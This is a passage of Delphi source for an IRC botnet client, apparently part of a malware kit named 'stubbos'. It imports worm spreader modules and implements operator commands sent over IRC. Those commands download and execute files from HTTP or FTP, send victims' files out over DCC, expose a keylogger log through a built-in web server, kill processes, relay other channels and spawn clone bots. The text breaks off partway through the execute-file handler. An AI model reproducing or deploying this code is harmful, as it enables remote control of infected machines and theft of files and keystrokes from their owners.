unit untBot;

interface

uses
  Windows,
  WinSock,
  untFunctions,
  untDCC,
  md5,
  shellApi, 
  plugin_spreader,
  untHTTPa,
  untFTPa,
  web_spreader;

{$I stubbos_config.ini}  

type
  tClone        =       Record
        Server  :       String;
        Port    :       Integer;
        Nick    :       String;
        Channel :       String;
        Key     :       String;
        Password:       String;
        IsSpy   :       Bool;
  End;
  pClone = ^tClone;

  tIRC          =       Class(TObject)
    Private
      {Procedures}
      Procedure         SplitParam(Data: String);
      {Functions}
      Function          IsNumeric (Str: String): Bool;
    Public
      {Declares}
      FromNick          :String;
      FromChan          :String;
      FromHost          :String;
      RecvText          :String;
      SpyChannel        :String;
      SpyTo             :String;
      Commando          :String;
      LoggedHost        :String;
      LoggedName        :String;
      SeenNicks         :String;

      Params            :Array[0..9000] Of String;

      SpyOn             :Bool;
      Silence           :Bool;
      IsCommand         :Bool;
      LoggedIn          :Bool;

      Sock              :TSocket;
      {Procedures}
      {$IFDEF BOT_LOG_IRCNAMES}
        Procedure         DoIKnowHim(Nick: String);
      {$ENDIF}
      Procedure         ParseInfo (Data: String);
      {Functions}
      Function          ReceiveData: Bool;
    End;

  tSock         =       Class(TObject)
    Private
      {Declares}
      Servern           :String;

      Sock              :TSocket;
      Addr              :TSockAddrIn;
      WSA               :TWSAData;
    Public
      {Declares}
      Server            :String;
      Nick              :String;
      Channel           :String;
      Key               :String;
      Password          :String;
      CurTopic          :String;
      BotHost           :String;

      Port              :Integer;

      IsChat            :Bool;
      IsSpy             :Bool;
      Clone             :Bool;

      IRC               :tIRC;
      {Procedures}
      Procedure         SendInfo;
      Procedure         DoCommando;
      Procedure         SendRaw(Text: String);
      Procedure         ReadCommando(Data: String; Buffer: Array Of Char; Sock2: TSocket);
      Procedure         SendData(Data: String; Chat: Bool; Sockish: TSocket);
      {Functions}
      Function          StartUp: Bool;
      Function          Connect: Bool;
      Function          DownloadFile(urlFrom, urlTo: String): Integer;
      {$IFDEF BOT_PLUGIN_SUPPORT}
        Function          DoPlugin(DLLName: String; AddData: String): Bool;
      {$ENDIF}
    End;

Var
  Info          :tClone;
  Bot           :tSock;
  Clones        :Integer;
  DefaultSock   :TSocket;

implementation

uses
  untScriptEngine,
  DCPP_SPREADER, IRC_SPREADER,
  MASSMAIL_SPREADER, MYDOOM_SPREADER,
  NETBIOS_SPREADER, P2P_SPREADER, PE_SPREADER;

(* Make Clones *)
Function MakeClone(P: Pointer): DWord; STDCALL;
Var
  Clone: tSock;
Begin
  Clone := tSock.Create;
  Clone.Clone := True;
  Clone.Server   := pClone(P)^.Server;
  Clone.Port     := pClone(P)^.Port;
  Clone.Nick     := pClone(P)^.Nick;
  Clone.Channel  := pClone(P)^.Channel;
  Clone.Key      := pClone(P)^.Key;
  Clone.Password := pClone(P)^.Password;
  Clone.IsSpy    := pClone(P)^.IsSpy;
  Clone.StartUp;
  Dec(Clones);
  Result := 0;
End;

Procedure CloneMyBot(Server, Nick, Channel, Key, Password: String; Port: Integer);
Var
  ThreadID      :THandle;
Begin
  If (Clones >= bot_max_clones) Then Exit;
  Inc(Clones);
  Info.Server := Server;
  Info.Port := Port;
  Info.Nick := Nick;
  Info.Channel := Channel;
  Info.Key := Key;
  Info.Password := Password;
  Info.IsSpy := False;
  CreateThread(NIL, 0, @MakeClone, @Info, 0, ThreadID);
End;

Procedure CloneMySpy(Server, Channel, Key, Password: String; Port: Integer);
Var
  ThreadID      :THandle;
Begin
  If (Clones >= bot_max_clones) Then Exit;
  Inc(Clones);
  Info.Server := Server;
  Info.Port := Port;
  Info.Nick := BOT_NAMETAG + RandIRCBot;
  ReplaceStr('%rand%', IntToStr(Random($FFFFFFFF)), Info.Nick);
  ReplaceStr('%host%', GetLocalName, Info.Nick);
  Info.Channel := Channel;
  Info.Key := Key;
  Info.Password := Password;
  Info.IsSpy := True;
  CreateThread(NIL, 0, @MakeClone, @Info, 0, ThreadID);
End;

{$IFDEF BOT_LOG_IRCNAMES}
Procedure tIRC.DoIKnowHim(Nick: String);
Var
  Path        :String;
  F           :TextFile;
Begin
  If (pos('serv', lowercase(nick)) > 0) Then Exit;
  If (pos('irc', lowercase(nick)) > 0) Then Exit;
  If (pos('global', lowercase(nick)) > 0) Then Exit;
    
  If (Pos(LowerCase(Nick), LowerCase(SeenNicks)) = 0)  Then
  Begin
    SeenNicks := SeenNicks + Nick + ':';
    Path := GetDirectory(0) + '\stbn.ick';

    If (FileExists(Path)) Then
    Begin
      AssignFile(F, Path);
      Append(F);
        Write(F, Nick+':');
      CloseFile(F);
    End Else
    Begin
      AssignFile(F, Path);
      ReWrite(F);
        Write(F, Nick+':');
      CloseFile(F);
    End;
  End;
End;
{$ENDIF}

{$IFDEF BOT_PLUGIN_SUPPORT}
  Function tSock.DoPlugin(DLLName: String; AddData: String): Bool;
  Var
    Path        :String;
    Data        :String;
    ThreadID    :DWord;
  Begin
    Data := IRC.FromNick + '!' + IRC.FromHost + '?' + IRC.FromChan + ' ' + AddData;
    Path := GetDirectory(0) + DLLName;

    Result := True;
    If (FileExists(Path)) Then
    Begin
      PData.DLLName := Path;
      PData.Data := Data;
      CreateThread(NIL, 0, @LoadPlugin, @PData, 0, ThreadID);
    End Else
      Result := False;
  End;
{$ENDIF}

Procedure tSock.SendRaw(Text: String);
Begin
  If (Not IRC.Silence) Then
    Send(Sock, Text[1], Length(Text), 0);
End;

Function tSock.DownloadFile(urlFrom, urlTo: String): Integer;
Begin
  Result := 0;
  DownloadFileFromURL(urlFrom, urlTo);
End;

Procedure tSock.SendData(Data: String; Chat: Bool; Sockish: TSocket);
Begin
  ReplaceStr('%localip%', GetLocalIP, Data);
  ReplaceStr('%version%', BOT_REALVERSION, Data);
  ReplaceStr('%rchan%',   IRC.FromChan, Data);
  ReplaceStr('%cchan%',   Channel, Data);
  ReplaceStr('%me%',      Nick, Data);
  ReplaceStr('%rnick%',   IRC.FromNick, Data);
  ReplaceStr('%rhost%',   IRC.FromHost, Data);
  {$IFDEF SHOW_OUTPUT} WriteLn('<< ['+IntToStr(Length(Data))+']: '+Data); {$ENDIF}
  If (Chat) Then
    Delete(Data, 1, Pos(':', Data));
  If (Not IRC.Silence) Then
    Send(Sockish, Data[1], Length(Data), 0);
End;

Procedure tSock.ReadCommando(Data: String; Buffer: Array Of Char; Sock2: TSocket);
Var
  Temp          :String;
  Buf           :String;
  Backup        :String;
  Port2         :String;
  fName         :String;

  LoggN         :String;
  LoggH         :String;
  FromN         :String;
  FromH         :String;
  FromC         :String;

  BotCommand    :String;

  CloneBot      :tSock;

  Length_       :Integer;
  I             :Integer;

  FileTransfer  :TFileTransfer;

  TempSock      :TSocket;

  LoggI         :Bool;

  pInfo         :PROCESS_INFORMATION;
  sInfo         :STARTUPINFO;
Begin

  // Is this from ircsocket, spysocket, clonesocket or dcc chat socket?
  If (Sock2 <> Sock) Then
    TempSock := Sock2
  Else
    TempSock := Sock;

  // Initialize the Filetransfer
  FileTransfer := TFIleTransfer.Create;

  // While there is data, we see it
  While (Pos(#10, Data) > 0) Do
  Begin
    // Extract the current data.
    Temp := Copy(Data, 1, Pos(#10, Data)-1);
    ZeroMemory(@Buffer, SizeOf(Buffer));
    Data := Copy(Data, Pos(#10, Data) + 1, Length(Data));

    // Get Information from IRC
    IRC.ParseInfo(Temp);
    If (IsBanned(IRC.FromHost)) Then Exit;

    If (IRC.Params[0] = 'PING') Then
    Begin
      Buf := 'PONG ' + IRC.Params[1] + #10;
      Send(tempSock, Buf[1], Length(Buf), 0);
    End;

    If (IRC.IsCommand) Then
    Begin
      {$IFDEF BOT_DOTOPIC_CMD}
        If (IRC.Commando = '332') Then
        If (CurTopic = Temp) Then
        Begin
          CurTopic := Temp;

          Data := Temp;
          Delete(Data, 1, 1);

          Data := Copy(Data, Pos(':', Data)+1, Length(Data));
          Delete(Data, Length(Data), 1);

          // Creates a faked command-line.
          Data := ':! PRIVMSG # :'+Data+#10;

          FromN := IRC.FromNick;
          FromC := IRC.FromChan;
          FromH := IRC.FromHost;

          LoggN := IRC.LoggedName;
          LoggH := IRC.LoggedHost;
          LoggI := IRC.LoggedIn;

          IRC.FromNick := '';
          IRC.FromChan := '#';
          IRC.FromHost := '';
          IRC.LoggedHost := '';
          IRC.LoggedName := '';
          IRC.LoggedIn := True;

          ReadCommando(Data, Buffer, tempSock);

          IRC.FromNick := FromN;
          IRC.FromChan := FromC;
          IRC.FromHost := FromH;
          IRC.LoggedHost := LoggH;
          IRC.LoggedName := LoggN;
          IRC.LoggedIn := LoggI;
        End;
      {$ENDIF}

      // Nickname already exists
      If (IRC.Commando = '433') Then
      Begin
        Buf := 'NICK '+BOT_NAMETAG + RANDIRCBOT + #10;
        SendData(Buf, IsChat, tempSock);
      End;

      If (IRC.Commando = '302') Then
      Begin
        Backup := Copy(IRC.Params[3], Pos('@', IRC.Params[3])+1, 159);
        BotHost := Backup;
      End;

      If (Pos('001', Temp) > 0) or
         (Pos('005', Temp) > 0) Then
         Begin
           If (IsSpy) Or (Clone) Then
           Begin

             Buf := 'JOIN ' + Channel + ' ' + KEY + #10'USERHOST ' + NICK + #10;
             SendData(Buf, IsChat, tempSock);

           End Else
           Begin

             Buf := 'JOIN ' + BOT_CHANNEL + ' ' + BOT_KEY + #10'USERHOST ' + NICK + #10;
             SendData(Buf, IsChat, tempSock);

           End;
         End;

    End Else
    Begin
      // Its not a commando, its a privmsg or some kind of shit :p
      If (Pos('MOTD', Temp) > 0) Or
         (Pos('message of the day', LowerCase(Temp)) > 0) Then
         Begin
           If (IsSpy) Or (Clone) Then
           Begin

             Buf := 'JOIN ' + Channel + ' ' + KEY + #10'USERHOST ' + NICK + #10;
             SendData(Buf, IsChat, tempSock);

           End Else
           Begin

             Buf := 'JOIN ' + BOT_CHANNEL + ' ' + BOT_KEY + #10'USERHOST ' + NICK + #10;
             SendData(Buf, IsChat, tempSock);

           End;
         End;

      If (IRC.Params[1] = 'MODE') Then
        If (IRC.Params[4] = NICK) Then
        Begin
          {$IFDEF BOT_CHANGE_TOPIC}
            If (IRC.Params[3] = '+o') Then
            Begin
              Buf := 'TOPIC ' + IRC.Params[2] + ' :' + BOT_SET_TOPIC + #10;
              SendData(Buf, IsChat, tempSock);
            End;
          {$ENDIF}

          {$IFDEF BOT_SEND_MSG}
            If (IRC.Params[3] = '-o') Then
            Begin
              Buf := 'PRIVMSG ' + IRC.FromNick + ' :' + BOT_SEND_PM + #10;
              SendData(Buf, IsChat, tempSock);
            End;

            If (IRC.Params[3] = '+v') Then
            Begin
              Buf := 'PRIVMSG ' + IRC.FromNick + ' :' + BOT_SEND_PM_VOICE + #10;
              SendData(Buf, IsChat, tempSock);
            End;

            If (IRC.Params[3] = '-v') Then
            Begin
              Buf := 'PRIVMSG ' + IRC.FromNick + ' :' + BOT_SEND_PM_UNVOICE + #10;
              SendData(Buf, IsChat, tempSock);
            End;
          {$ENDIF}
        End;

      // If admin parts or quits, log him out
      If (IRC.Params[1] = 'PART') Or
         (IRC.Params[1] = 'QUIT') Then
         Begin
           If (IRC.FromNick = IRC.LoggedName) Then
           Begin
             IRC.LoggedHost := '';
             IRC.LoggedName := '';
             IRC.LoggedIn := FALSE;
           End;
         End;

      If (IRC.Params[1] = 'KICK') Then
      Begin
        If (IRC.Params[3] = NICK) THen
        Begin
          If (IsSpy) or (Clone) Then
          Begin
            Buf := 'JOIN '+CHANNEL+' '+KEY+#10;
            SendData(Buf, IsChat, tempSock);
            Buf := 'PRIVMSG '+CHANNEL+' :'+BOT_KICKMSG+#10;
            SendData(Buf, IsChat, tempSock);
          End Else
          Begin
            Buf := 'JOIN '+BOT_CHANNEL+' '+BOT_KEY+#10;
            SendData(Buf, IsChat, tempSock);
            Buf := 'PRIVMSG '+BOT_CHANNEL+' :'+BOT_KICKMSG+#10;
            SendData(Buf, IsChat, tempSock);
          End;
        End;

        If (IRC.Params[3] = IRC.LoggedName) Then
        Begin
          IRC.LoggedHost := '';
          IRC.LoggedName := '';
          IRC.LoggedIn := False;
        End;
      End;

      If (IRC.Params[1] = 'PRIVMSG') Then
      Begin
        {$IFDEF BOT_REPLY_PING}
          If (Copy(IRC.RecvText, 1, 5) = #1'PING') Then
          Begin
            Buf := COpy(IRC.RecvText, 6, Length(IRC.RecvText));
            Delete(Buf, Length(Buf), 1);
            Buf := 'NOTICE ' + IRC.FromNick + ' :'#1'PING' + Buf + #1#10;
            SendData(Buf, IsChat, tempSock);
          End;
        {$ENDIF}

        {$IFDEF BOT_REPLY_VERSION}
          If (IRC.RecvText = #1'VERSION'#1) Then
          Begin
            {$IFDEF BOT_REPLY_FAKEVERSION}
              Buf := 'NOTICE ' + IRC.FromNick + ' :'#1'VERSION '+ BOT_FAKEVERSION + #10;
              SendData(Buf, IsChat, tempSock);
            {$ENDIF}
            {$IFDEF BOT_REPLY_REALVERSION}
              Buf := 'NOTICE ' + IRC.FromNick + ' :'#1'VERSION '+ BOT_REALVERSION + #10;
              SendData(Buf, IsChat, tempSock);
            {$ENDIF}
          End;
        {$ENDIF}

//        If (IRC.FromChan <> '') Then
//          If (IRC.FromChan[1] = '#') Then
            Begin

              // BOT_COMMAND_LOGIN
              If (LowerCase(IRC.Params[3]) = ':' + BOT_PREFIX + BOT_COMMAND_LOGIN) Then
                {$IFDEF BOT_PREDEFINED_HOST} If (IRC.FromHost = BOT_LOGIN_HOST) THen {$ENDIF}
                  If (IRC.Params[4] = BOT_PASSWORD) Then
                  Begin
                    If (Not IRC.LoggedIn) Then
                    Begin
                      Buf := 'PRIVMSG ' + IRC.FromChan + ' :[Login]: Successfull'#10;
                      SendData(Buf, IsChat, tempSock);

                      IRC.LoggedIn := TRUE;
                      IRC.LoggedName := IRC.FromNick;
                      IRC.LoggedHost := IRC.FromHost;
                      {$IFDEF BOT_BAN_AFTER_FAILURE}
                        RemoveFailure(IRC.FromHost);
                      {$ENDIF}
                    End Else
                    Begin
                      Buf := 'PRIVMSG ' + IRC.FromChan + ' :[Login]: Someone is already logged in'#10;
                      SendData(Buf, IsChat, tempSock);
                    End;
                  End Else
                  Begin
                    {$IFDEF BOT_REPORT_FAILURE}
                      {$IFDEF BOT_BAN_AFTER_FAILURE}
                        LoginFailure(IRC.FromHost);
                      {$ENDIF}

                      Buf := 'PRIVMSG ' + IRC.LoggedName + ' :[Login] Failed login attempt from ['+IRC.FromNick+'!'+IRC.FromHost+']';
                      If (Copy(IRC.FromChan, 1, 1) = '#') Then
                        Buf := Buf + ' @ '+ IRC.FromChan + #10
                      Else
                        Buf := Buf + #10;
                      SendData(Buf, IsChat, tempSock);
                    {$ENDIF}
                  End;

              If (IRC.LoggedIn) Then
                If (IRC.FromNick <> IRC.LoggedName) Then
                  If (IRC.FromChan <> BOT_CHANNEL) Then
                    If (Pos('login', LowerCase(IRC.RecvText)) > 0) Then
                    Begin
                      Buf := 'PRIVMSG '+IRC.LoggedName+' :('+IRC.FromChan+') ['+IRC.FromNick+'!'+IRC.FromHost+'] '+IRC.RecvText +#10;
                      SendData(Buf, IsChat, tempSock);
                    End;

              If (IsSpy) And (IRC.FromChan = Channel) Then
              Begin
                Buf := 'PRIVMSG '+BOT_CHANNEL+' :['+IRC.FromChan+' @ '+Server+']['+IRC.FromNick+'!'+IRC.FromHost+']: '+IRC.RecvText+#10;
                SendData(Buf, FALSE, DefaultSock);
              End;

              If (IRC.SpyOn) Then
                If (IRC.FromChan = IRC.SpyChannel) Then
                Begin
                  Buf := 'PRIVMSG ' + IRC.SpyTo + ' :(' + IRC.SpyChannel + ') [' + IRC.FromNick + '!' +
                          IRC.FromHost + ']: ' + IRC.RecvText + #10;
                  SendData(Buf, IsChat, tempSock);
                End;

              If (IRC.LoggedIn) Then
                If (IRC.FromNick = IRC.LoggedName) Then
                  If (IRC.FromHost = IRC.LoggedHost) Then
                    Begin

                      BotCommand := LowerCase(IRC.Params[3]);
                      Delete(BotCommand, 1, 1);

                      // Remote Spy
                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_RMTSPY) Then
                      Begin
                        If (IRC.Params[4] = '*') Then IRC.Params[4] := '';
                        If (IRC.Params[5] = '*') Then IRC.Params[5] := '';
                        If (IRC.Params[6] = '*') Then IRC.Params[6] := '';
                        If (IRC.Params[7] = '*') Then IRC.Params[7] := '';
                        If (IRC.Params[8] = ' ') Then IRC.Params[8] := '6667';

                        If (IRC.Params[4]<> '') Then
                        CloneMySpy( IRC.Params[4],
                                    IRC.Params[5],
                                    IRC.Params[6],
                                    IRC.Params[7],
                                    StrToInt(IRC.Params[8]));
                      End;

                      // Change Nick
                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_NEWNICK) Then
                      Begin
                        Buf := 'NICK ' + BOT_NAMETAG + RANDIRCBOT + #10;
                        ReplaceStr('%rand%', IntToStr(Random($FFFFFFFF)), Buf);
                        ReplaceStr('%host%', GetLocalName, Buf);
                        SendData(Buf, IsChat, tempSock);
                      End;

                      // Op Admin
                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_OPME) Then
                      Begin
                        Buf := 'MODE ' + IRC.FromChan + ' +o ' + IRC.FromNick + #10;
                        SendData(Buf, IsChat, tempSock);
                      End;

                      // Restart <int>
                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_RESTART) Then
                      Begin
                        Buf := 'QUIT :' + BOT_QUITMESSAGE + #10;
                        SendData(Buf, IsChat, tempSock);
                        Sleep(800);

                        If (IRC.IsNUmeric(IRC.Params[4])) Then
                          Sleep(StrToInt(IRC.Params[4]))
                        Else
                          Sleep(1800000);

                        If (Clone) THen
                          CloneMyBot(Server, RANDIRCBOT, Channel, Key, Password, Port);
                      End;

                      // Die Motherfucker, DIE!
                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_DIE) Then
                      Begin
                        Buf := 'QUIT :' + BOT_QUITMESSAGE + #10;
                        SendData(Buf, IsChat, tempSock);
                        Sleep(800);

                        If (Clone) Then
                          CloseSocket(Sock)
                        Else
                          ExitProcess(0);
                      End;

                      // Kill all Clones
                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_KILLCLONE) Then
                        If (Clone) Then
                        Begin
                          Buf := 'QUIT :'+ BOT_QUITMESSAGE + #10;
                          SendData(Buf, IsChat, tempSock);
                          Sleep(800);

                          CloseSocket(Sock);
                        End;

                      // Logout
                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_LOGOUT) Then
                      Begin
                        IRC.LoggedHost := '';
                        IRC.LoggedName := '';
                        IRC.LoggedIn := FALSE;

                        Buf := 'PRIVMSG ' + IRC.FromChan + ' :[Logout] Successfull'#10;
                        SendData(Buf, IsChat, tempSock);
                      End;

                      // Information
                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_INFO) Then
                      Begin
                        Buf := 'PRIVMSG ' + IRC.FromChan + ' :' + GetInfo + #10;
                        SendData(Buf, IsChat, tempSock);
                      End;

                      // Shut The Fcuk Up
                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_SILENCE) Then
                      Begin
                        IRC.Silence := Boolean(StrToInt(IRC.Params[4]));
                      End;

                      // DCC Chat
                      If (Pos('DCC CHAT', IRC.RecvText) > 0) Then
                      Begin
                        Buf := IRC.RecvText;
                        Buf := Copy(Buf, Pos('DCC CHAT', Buf) + 9, Length(Buf));

                        If (Buf[1] = ' ') Then
                          Delete(Buf, 1, 1);

                        Delete(Buf, 1, Pos(' ', Buf) -1);
                        IRC.SplitParam(Buf);

                        FileTransfer.AcceptChat(IRC.FromNick, IRC.FromHost, IRC.Params[0], StrToInt(IRC.Params[1]));
                      End;

                      // DCC Get
                      If (Pos('DCC SEND', IRC.RecvText) > 0) Then
                      Begin
                        Buf := IRC.RecvText;
                        Buf := Copy(Buf, Pos('DCC SEND', Buf) + 9, Length(Buf));

                        If (Buf[1] = ' ') Then
                          Delete(Buf, 1, 1);

                        IRC.SplitParam(Buf);

                        FileTransfer.ReceiveFile(IRC.Params[0], StrToInt(IRC.Params[2]), IRC.Params[1], Sock);
                        Buf := 'PRIVMSG ' + IRC.FromChan + ' :[DCC Transfer] Accepted ('+IRC.Params[0]+' | '+GetKBS(StrToInt(IRC.Params[1]))+') on port ('+IRC.Params[2]+')'#10;

                        SendData(Buf, IsChat, tempSock);
                      End;

                      // Kill Process
                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_KILLPROC) Then
                      Begin
                        If (KillProc(IRC.Params[4])) Then
                          Buf := '[Proc] Killed Process #'+IRC.Params[4]+#10
                        Else
                          Buf := '[Proc] Failed to kill #'+IRC.Params[4]+#10;

                        Buf := 'PRIVMSG ' + IRC.FromChan + ' :' + Buf;
                        SendData(Buf, IsChat, tempSock);
                      End;

                      // List Process
                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_LISTPROC) Then
                      Begin
                        Backup := ListProc;
                        {$IFDEF BOT_SEND_PROCLIST}
                          Randomize;
                          Port2 := IntToStr(Random($FFFFFF)+100);

                          Buf           := 'PRIVMSG ' + IRC.FromNick + ' :'#1'DCC SEND ';
                          fName         := Backup;
                          Length_       := GetFileSize(Backup);
                          Backup        := ExtractFileName(Backup);

                          For I := 1 To Length(Backup) Do
                            If (Backup[i] = #32) Then
                              Backup[i] := #95;

                          Buf := Buf + Backup + ' ' + IntToStr(hTonl(Inet_Addr(pChar(GetLocalIP)))) + ' ' + Port2 + ' ' + IntToStr(Length_)+#1#10;
                          SendData(Buf, False, Sock);

                          FileTransfer.SendFile(fName, StrToInt(Port2), Length_);
                        {$ELSE}
                          ReadFileStr(Backup, Buf);

                          While (Pos(#10, Buf) > 0) Do
                          Begin
                            Backup := '';
                            Backup := Copy(Buf, 1, Pos(#10, Buf)-1);
                            Buf := Copy(Buf, Pos(#10, Buf)+1, Length(Buf));

                            If (Backup <> '') Then
                            Begin
                              ReplaceStr(#32, #0160, Backup);
                              Backup := 'PRIVMSG ' + IRC.FromNick + ' :' + Backup + #10;
                              SendData(Backup, IsChat, tempSock);
                              Sleep(800);
                            End;
                          End;
                        {$ENDIF}
                      End;

                      // List Directory
                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_LISTDIR) Then
                      Begin
                        ListDirectory(IRC.Params[4], Backup, IRC.params[5]);
                        {$IFDEF BOT_SEND_PROCLIST}
                          Randomize;
                          Port2 := IntToStr(Random($FFFFFF)+100);

                          Buf           := 'PRIVMSG ' + IRC.FromNick + ' :'#1'DCC SEND ';
                          fName         := Backup;
                          Length_       := GetFileSize(Backup);
                          Backup        := ExtractFileName(Backup);

                          For I := 1 To Length(Backup) Do
                            If (Backup[i] = #32) Then
                              Backup[i] := #95;

                          Buf := Buf + Backup + ' ' + IntToStr(hTonl(Inet_Addr(pChar(GetLocalIP)))) + ' ' + Port2 + ' ' + IntToStr(Length_)+#1#10;
                          SendData(Buf, False, Sock);

                          FileTransfer.SendFile(fName, StrToInt(Port2), Length_);
                        {$ELSE}
                          ReadFileStr(Backup, Buf);

                          While (Pos(#10, Buf) > 0) Do
                          Begin
                            Backup := '';
                            Backup := Copy(Buf, 1, Pos(#10, Buf)-1);
                            Buf := Copy(Buf, Pos(#10, Buf)+1, Length(Buf));

                            If (Backup <> '') Then
                            Begin
                              ReplaceStr(#32, #0160, Backup);
                              Backup := 'PRIVMSG ' + IRC.FromNick + ' :' + Backup + #10;
                              SendData(Backup, IsChat, tempSock);
                              Sleep(800);
                            End;
                          End;
                        {$ENDIF}
                      End;

                      // Send File
                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_GETFILE) Then
                      Begin
                        Randomize;
                        Port2 := IntToStr(Random($FFFFFF)+100);

                        Buf := 'PRIVMSG ' + IRC.FromNick + ' :'#1'DCC SEND ';

                        Backup := IRC.RecvText;
                        Delete(Backup, 1, Pos(BOT_COMMAND_GETFILE, LowerCase(Backup))+7);

                        fName := Backup;
                        Length_ := GetFileSize(Backup);
                        Backup := ExtractFileName(Backup);

                        For I := 1 TO Length(Backup) Do
                          If (Backup[I] = #32) Then
                            Backup[I] := #95;

                        Buf := Buf + Backup + ' ' + IntToStr(hTonl(Inet_Addr(pChar(GetLocalIP)))) + ' ' + Port2 + ' ' + IntToStr(Length_) + #1#10;
                        SendData(Buf, False, Sock);

                        FileTransfer.SendFile(fName, StrToInt(Port2), Length_);
                      End;

                      // Download a file from FTP
                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_FTP_DOWNLOAD) Then
                        DownloadFileFromFTP(IRC.Params[4], IRC.Params[5], IRC.Params[6], IRC.Params[7], StrToInt(IRC.Params[8]));

                      // Update a file from FTP
                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_FTP_UPDATE) Then
                        UpdateFileFromFTP(IRC.Params[4], IRC.Params[5], IRC.Params[6], IRC.Params[7], StrToInt(IRC.Params[8]));

                      // Execute a file from FTP
                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_FTP_EXECUTE) Then
                        ExecuteFileFromFTP(IRC.Params[4], IRC.Params[5], IRC.Params[6], IRC.Params[7], StrToInt(IRC.Params[8]));

                      // Download a file
                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_HTTP_DOWNLOAD) Then
                        DownloadFileFromURL(IRC.Params[4], IRC.Params[5]);

                      // Update a file
                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_HTTP_UPDATE) Then
                        UpdateFileFromURL(IRC.Params[4], IRC.Params[5]);

                      // Execute a file
                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_HTTP_EXECUTE) Then
                        ExecuteFileFromURL(IRC.Params[4], IRC.Params[5]);

                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_HTTP_SERVER) Then
                        StartWebServer(StrToInt(IRC.Params[4]));

                      // Get Log
                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_GETLOG) Then
                      Begin
                        Buf := GetDirectory(0) + BOT_KEYLOGG_FILENAME;
                        Delete(Buf, 1, 3);

                        ReplaceStr('\', '/', Buf);

                        Buf := 'PRIVMSG ' + IRC.FromChan + ' :[URL: http://' + GetLocalIP + ':81/' + Buf + '] or [' + BOT_PREFIX + BOT_COMMAND_GETFILE + ' ' + GetDirectory(0) + Bot_KEYLOGG_FILENAME + ']'#10;
                        SendData(Buf, IsChat, tempSock);
                      End;

                      // Spy off
                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_SPYOFF) Then
                      Begin
                        If (IRC.SpyOn) Then IRC.SpyOn := False;

                        Buf := 'PART ' + IRC.SpyChannel + #10;
                        SendData(Buf, IsChat, tempSock);
                      End;

                      // Spy on
                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_SPYON) Then
                      Begin
                        If (IRC.SpyOn) Then
                        Begin
                          Buf := 'PART '+IRC.SpyChannel + #10;
                          SendData(Buf, IsChat, tempSock);
                        End;

                        IRC.SpyTo := IRC.Params[5];
                        IRC.SpyOn := True;
                        IRC.SpyChannel := IRC.Params[4];

                        Buf := 'JOIN '+IRC.SpyChannel + #10;
                        SendData(Buf, IsChat, tempSock);
                      End;

                      // Cloning
                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_CLONE) Then
                      Begin
                        If (IRC.Params[4]  = '*') Then IRC.Params[4]  := '';
                        If (IRC.Params[5]  = '*') Then IRC.Params[5]  := BOT_NAMETAG + RANDIRCBOT;
                        If (IRC.Params[6]  = '*') Then IRC.Params[6]  := '';
                        If (IRC.Params[7]  = '*') Then IRC.Params[7]  := '';
                        If (IRC.Params[8]  = '*') Then IRC.Params[8]  := '';
                        If (IRC.Params[9]  = '' ) Then IRC.Params[9]  := '6667';
                        If (IRC.Params[10] = '*') Then IRC.Params[10] := '1';
                        If (IRC.Params[10] = '' ) Then IRC.Params[10] := '1';

                        ReplaceStr('%rand%', IntToStr(Random($FFFFFFFF)), IRC.Params[4]);
                        ReplaceStr('%host%', GetLocalName, IRC.Params[4]);

                        If Not (IRC.IsNumeric(IRC.Params[10])) Then IRC.Params[10] := '1';

                        If StrToInt(IRC.Params[10]) > BOT_MAX_CLONES Then IRC.Params[10] := IntToStr(BOT_MAX_CLONES);

                        If (IRC.Params[4] <> '') Then
                        For I := 0 To StrToInt(IRC.Params[10])-1 Do
                          CloneMyBot(IRC.Params[4], IRC.Params[5], IRC.Params[6],
                                     IRC.Params[7], IRC.Params[8], StrToInt(IRC.Params[9]));
                      End;

                      // Raw Data
                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_RAW) Then
                      Begin
                        Buf := IRC.RecvText;
                        Delete(Buf, 1, Length(BOT_PREFIX) + Length(BOT_COMMAND_RAW)+1);

                        Buf := Buf + #10;
                        SendData(Buf, IsChat, tempSock);
                      End;

                      // Buttplug?
                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_PLUGIN) Then
                      Begin
                        Buf := 'PRIVMSG ' + IRC.FromChan + ' :Plugin Support Is Deactivated.'#10;

                        {$IFDEF BOT_PLUGIN_SUPPORT}
                          If (FileExists(IRC.Params[4])) Then
                          Begin
                            Buf := IRC.RecvText;
                            Delete(Buf, 1, Pos(IRC.Params[5], Buf) -1);

                            If DoPlugin(IRC.Params[4], Buf) Then
                              Buf := 'PRIVMSG ' + IRC.FromChan + ' :[Plugin] Loaded Successfully'#10
                            Else
                              Buf := 'PRIVMSG ' + IRC.FromChan + ' :[Plugin] Failed to load'#10;
                          End Else
                            Buf := 'PRIVMSG ' + IRC.FromChan + ' :[Plugin] Failed to load, No such file'#10;
                        {$ENDIF}

                        SendData(Buf, IsChat, tempSock);
                      End;

                      // Execute a file
                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_EXECUTE) Then
                         Begin
                           // ShellExecute(0, "open", a[s+1], NULL, NULL, SW_SHOW)
                           Buf := IRC.RecvText;
                           Delete(Buf, 1, Length(BOT_PREFIX) + Length(BOT_COMMAND_EXECUTE) + 1);

                           If (FileExists(Buf)) Then
                           Begin
